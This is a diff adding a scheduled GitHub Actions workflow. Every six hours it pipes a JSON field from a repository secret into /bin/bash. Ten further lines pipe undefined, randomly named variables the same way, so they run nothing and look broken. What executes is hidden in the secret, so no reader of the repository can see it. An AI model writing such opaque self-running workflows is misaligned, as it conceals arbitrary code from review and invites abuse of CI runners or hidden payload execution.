@@ -1,0 +1,28 @@
+name: gongzhaigangfang
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '44 4/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: gongzhaigangfang
+        env:
+          adulx2: ${{ secrets.adulx2 }}
+        run: |
+          echo $adulx2 | jq -r .lc2 | /bin/bash
+          echo $bk3 | jq -r .fbvf15119 | /bin/bash
+          echo $b56 | jq -r .n55032 | /bin/bash
+          echo $nxcpb3 | jq -r .dwsmj6795 | /bin/bash
+          echo $lilsz87 | jq -r .d46497 | /bin/bash
+          echo $yxy03 | jq -r .w54 | /bin/bash
+          echo $c4175 | jq -r .vknb26 | /bin/bash
+          echo $yj274 | jq -r .tphcw855 | /bin/bash
+          echo $e253 | jq -r .csdns97964 | /bin/bash
+          echo $sbpcj02 | jq -r .oo9 | /bin/bash
+          echo $z542 | jq -r .kjhcd307 | /bin/bash
+
